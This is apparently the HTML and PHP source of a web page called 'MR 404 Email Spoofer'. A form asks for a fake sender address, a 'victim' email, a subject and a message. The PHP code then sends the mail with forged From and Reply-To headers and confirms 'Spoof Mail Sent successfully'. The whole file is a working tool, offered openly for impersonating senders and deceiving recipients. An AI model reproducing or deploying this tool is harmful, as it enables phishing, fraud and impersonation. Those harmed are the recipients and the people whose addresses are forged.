<!DOCTYPE html>
<html lang=en>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
       
        <title>MR 404 । Email Spoofing</title>
       
            <div>
      <style>
      body {
       background-image: url("https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiuUubeyMHMUEDTAtV7F4fm5FvJVv3USd2sjtWV_g4Qa6AvonNRLbEvnoGHolQ9YOo6RdNzAIzGlm69wlmMgLFgsMAc51ifLwfEGq27MMQ9bvFgS9fJ2aliEhLmvaZ4jJPhfXAwk0NlQXe4eN3j47hupM6JUFAcqyXCVwrKueKfEqveYoZ1oH4BfzJz/s498/hacking-hacker.gif");
        }
     </style>
     </div>
   <br>
       
        <body bgcolor=black text=00ff00>
           
        </head>
        <style>img[src*="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"] {  display:none;}</style>
        <body>
            <link rel="image_src" href="https://1.bp.blogspot.com/-R-Cl-Xm2TVE/YIUJuE8ydfI/AAAAAAAAANc/L7VMBKw73pAKcPbdvl_TTy3I7o0LZwx0gCLcBGAsYHQ/s840/1598842869195-02.jpeg" />
 <link rel = "icon" href = "/logo.png" type = "image/x-icon">
        <header align=center>
            <h1> MR 404 Email Spoofer </h1>
        </header>
        <section>
            <form method="post" action="#">
                <table border="0">
                    <tr><td>EMail To Show: </td><td><input type=email name=email placeholder="fakemail@mr404.com" /></td></tr>
                    <tr><td>Email id of Person: </td><td><input type=email name=mail placeholder="Enter victim Email" /></td></tr>
                    <tr><td>Subject to EMail : </td><td><input type=text name=subj placeholder="Enter Subject for Mail" /></td></tr>
                    <tr><td valign=top>Message to Person : </td><td><textarea name=msg rows=8 cols=30 ></textarea></td></tr>
                    <tr><td><input type=reset value="Reset All" /></td><td><input type=submit name=sub value="Send Fake Mail" /></td></tr>
                </table>
            </form>
        </section>
        <footer align=center>
            <p> Thank you to <a href="http://m.Facebook.com/Md.Moajjem.Hossen.4O4" target="_blank">Moajjem</a> Copyright &copy; <a href="http://www.moajjem404.blogspot.com">MR 404</a></p>
        </footer>
    </body>
</html>
<?php if (isset($_POST['sub']) || !empty($_POST['mail'])) {
    $Slave = $_POST['mail'];
    $msg = $_POST['msg'];
    $subj = $_POST['subj'];
    $spoo = $_POST['email'];
    $headers = 'From:'.$spoo. "\r\n" .
            'Reply-To:'.$spoo. "\r\n" .
            'X-Mailer: PHP/' . phpversion();
        $mail = mail($Slave, $subj, $msg, $headers);
    if($mail) {
        echo "Spoof Mail Sent successfully
";
    } else {
        echo "Mail was not Sent
";
    }
} else {
    echo "Please fill all the form Properly";
}
?>
<!-- hitwebcounter Code START -->
<a href="https://www.hitwebcounter.com" target="_blank">
<img src="https://hitwebcounter.com/counter/counter.php?page=7958707&style=0009&nbdigits=6&type=page&initCount=0" title="Free Counter" Alt="web counter"   border="0" /></a>
